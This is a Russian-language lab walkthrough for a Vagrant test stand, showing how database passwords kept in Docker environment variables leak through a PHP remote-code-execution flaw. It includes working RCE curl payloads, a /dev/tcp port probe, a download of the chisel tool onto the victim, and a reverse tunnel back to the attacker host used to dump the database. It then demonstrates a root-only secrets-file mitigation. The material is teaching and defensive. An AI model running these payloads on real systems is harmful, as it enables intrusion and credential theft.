# SECINFO: Docker. Part II. Passwords in environment variable

## Intro

В данной части я хочу рассказать о том какую опасность несут в себе
пароли сохранные в переменных окружения. И продемонстрировать
техники pivoting'а позволяющие получить сетевой доступ к закрытой
части инфраструктуры с хоста атакующего.

Для запуска потребуется:
- virtualbox
- vagrant
- ansible

## Thesaurus

`RCE` - Remote Code Execution.

`pivoting` - способ предоставления сетевого доступа к закрытой инфраструктуре с
хоста атакующего. 

## Stand

Стенд аналогичен представленному в [Part I. Root in main process](../PartI/README.md).
Так же состоит из двух виртуальных машин `hacker` и `victim` объеденных сетью.
Единственная разница, что на VM `victim` в docker-окружении будет запущено 2
контейнера. Уязвимое веб-приложение и БД MariaDB. При этом порты контейнера 
MariaDB не будут выставлены наружу. Доступ к БД можно будет получить только из
контейнера с web-приложением.

Настройки хостов:
- `victim` IP: 192.168.50.6;
- `hacker` IP: 192.168.50.7.

Для запуска стенда выполните команду:
```
 $ vagrant up
```

Для запуска примера выполните следующие шаги на хосте `victim`:
```
$ vagrant ssh victim
vagrant@victim:~$ cd /vagrant/victim/
vagrant@victim:/vagrant/victim$ docker-compose up --build -d
```
После этого на хосте `victim` запуститься два контейнера: с уязвимым
web-приложением и с БД mariadb, которая не имеет открытых, в хостовой системе,
портов

## Exploitation

Зайдём в VM `hacker`:
```
$ vagrant ssh hacker
```

Проверим от имени какого пользователя запущено web-приложение, для этого
выполним команду `id`:
```
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('id');"
  <h1> Hello world!</h1>
  uid=1000(web) gid=1000(web) groups=1000(web)
  <br>
```

Теперь получим список переменных окружения:
```
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('env');"
  <h1> Hello world!</h1>
  ...
  MARIADB_DATABASE=production
  MARIADB_HOSTNAME=mariadb
  MARIADB_ROOT_PASSWORD=strongpassword
  MARIADB_PASSWORD=verystrongpassword
  MARIADB_USER=prod
  ...
  <br>
```

Как видим из листинга, в переменных окружения имеется конфигурация соединения
с БД сервером. Да же есть hostname этого сервера `MARIADB_HOSTNAME`. Предположительно
запущенного то же в докере на том же хосте. Проверим имеется ли сетевой доступ 
до этого хоста:
```
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('timeout 1 bash -c \'cat < /dev/null > /dev/tcp/mariadb/3306\' && echo Open || echo Closed');"
  <h1> Hello world!</h1>
  Open
  <br>
```

Что бы не мучиться с пробросом DNS, определим IP адрес сервера mariadb:
```
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('getent hosts mariadb');"
  <h1> Hello world!</h1>
  172.18.0.2      mariadb
  <br>
```

Как мы видим у web-приложения есть сетевая связанность с сервером БД, что 
логично. Так в docker-контейнере нет приложения для работы с сервером БД, а
запрограммировать приложение на PHP для того что бы сделать dump базы данных
мне лень. Воспользуемся техникой `pivoting` для получения доступа к БД. 
Воспользуемся приложением [chisel](https://github.com/jpillora/chisel):
```
vagrant@hacker:~$ curl -L https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_amd64.gz --output chisel.gz
vagrant@hacker:~$ gzip -d chisel.gz
vagrant@hacker:~$ chmod +x chisel
```

Загрузим приложение на `victim` и запустим его:
```
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('curl -L https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_amd64.gz --output /tmp/chisel.gz 2>&1');"
  <h1> Hello world!</h1>
    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                   Dload  Upload   Total   Spent    Left  Speed
  100   651  100   651    0     0   3518      0 --:--:-- --:--:-- --:--:--  3518
  100 3346k  100 3346k    0     0   789k      0  0:00:04  0:00:04 --:--:--  870k
  <br>
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('cd /tmp && gzip -d chisel.gz && chmod +x chisel');"
  <h1> Hello world!</h1>
  <br>
```

Запустим серверную часть chisel на хосте `hacker`, для этого откроем новый терминал и выполним:
```
$ vagrant ssh hacker
vagrant@hacker:~$ ./chisel server -p 8008 --reverse
  2020/11/29 15:02:22 server: Reverse tunnelling enabled
  2020/11/29 15:02:22 server: Fingerprint tyWC23cR/aMoDOJKIjwdXIlzirzNP4bkS3KNRlLa78k=
  2020/11/29 15:02:22 server: Listening on http://0.0.0.0:8008
```

Теперь запустим chisel на хосте `victim` при помощи команды:
```
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('/tmp/chisel client 192.168.50.7:8008 R:3306:172.18.0.2:3306 2>&1');"
  <h1> Hello world!</h1>
  2020/11/29 15:04:51 client: Connecting to ws://192.168.50.7:8008
  2020/11/29 15:04:51 client: Connected (Latency 2.219222ms)
```

Откроем ещё один терминал на `hacker`:
```
$ vagrant ssh hacker
vagrant@hacker:~$ mysqldump -h 127.0.0.1 -uprod -p production
  Enter password: 

  <...>
  LOCK TABLES `flag` WRITE;
  /*!40000 ALTER TABLE `flag` DISABLE KEYS */;
  INSERT INTO `flag` VALUES (1,'Flag captured');
  /*!40000 ALTER TABLE `flag` ENABLE KEYS */;
  UNLOCK TABLES;
  /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
  <...>
```

## Solution I

Единственным решением является отказать от передаче паролей через 
переменные окружения. Но необходимо предложить альтернативу так как
эта информация необходима для формирования конфигурационных-файлов
и пр. 

Я предлагаю сохранять конфиденциальную информацию в отдельный файл
и монтировать его с правами доступа только для пользователя `root`.
В момент выполнения init-скрипта эти переменные будут загружаться
формироваться файлы настроек и выгружаться из окружения.

Для реализации данного способа необходимо внести следующие изменения.
В Dockerfile:
```
...
RUN mkdir /run/secrets && chown root:root /run/secrets && chmod 0700 /run/secrets
...
```

В init-script:
```
#!/bin/bash

if [ -f /run/secrets/secrets ]; then
  . /run/secrets/secrets
fi

...

#Clean security sensitive variable
if [ -f /run/secrets/secrets ]; then
  awk -F'=' '{if ($1!="") {print $1}}' /run/secrets/secrets | while read -r VAR; do
    unset "$VAR"
  done
fi

exec sudo -E -u web "$@"
```

В docker-compose.yml
```
  webapp:
    build:
      context: .
      dockerfile: Dockerfile
    volumes:
      - ./.env:/run/secrets/secrets:ro
    ports:
      - "80:8080"

```

Внесём эти изменения и перезапустим приложение:
```
vagrant@victim:/vagrant/victim$ docker-compose stop
  Stopping victim_webapp_1  ... done
  Stopping victim_mariadb_1 ... done
   docker-compose up --build -d
  Building webapp
  Step 1/8 : FROM php:7.4-cli
   ---> 639632eff06b
  Step 2/8 : WORKDIR /app
   ---> Using cache
   ---> d97dd703f6bd
  Step 3/8 : RUN apt-get update && apt-get install -y sudo && rm -rf /var/lib/apt/lists/*
   ---> Using cache
   ---> c1613a4f253c
  Step 4/8 : RUN mkdir /run/secrets && chown root:root /run/secrets && chmod 0700 /run/secrets
   ---> Running in 35d2cb627010
  Removing intermediate container 35d2cb627010
   ---> df4fef6566a2
  Step 5/8 : COPY index.php index.php
   ---> 6f9695706c5c
  Step 6/8 : COPY init /usr/local/bin/
   ---> d5184d07c478
  Step 7/8 : ENTRYPOINT ["/usr/local/bin/init"]
   ---> Running in 1a2750eaa5a8
  Removing intermediate container 1a2750eaa5a8
   ---> 46d9cdba9119
  Step 8/8 : CMD [ "php", "-S", "0.0.0.0:8080" ]
   ---> Running in 6ee1b56699e7
  Removing intermediate container 6ee1b56699e7
   ---> f78643b8c10c

  Successfully built f78643b8c10c
  Successfully tagged victim_webapp:latest
  Starting victim_mariadb_1  ... done
  Recreating victim_webapp_1 ... done
```

Попробуем теперь получить значения переменных окружения с хоста `hacker`:
```
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('env | grep MARIADB');"
  <h1> Hello world!</h1>
  <br>
```

Как видим переменных связанных с настройкой mariadb в переменных окружения нет.
Попробуем получить их непосредственно из файла `/run/secrets/secrets`:
```
vagrant@hacker:~$ curl -G 192.168.50.6 --data-urlencode "code=system('cat /run/secrets/secrets 2>&1');"
  <h1> Hello world!</h1>
  cat: /run/secrets/secrets: Permission denied
  <br>
```

Конечно это будет работать только если приложение запущенно из под
не привилегированного пользователя.

## Solution II

consul-template

# Links 

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md
- https://github.com/jpillora/chisel
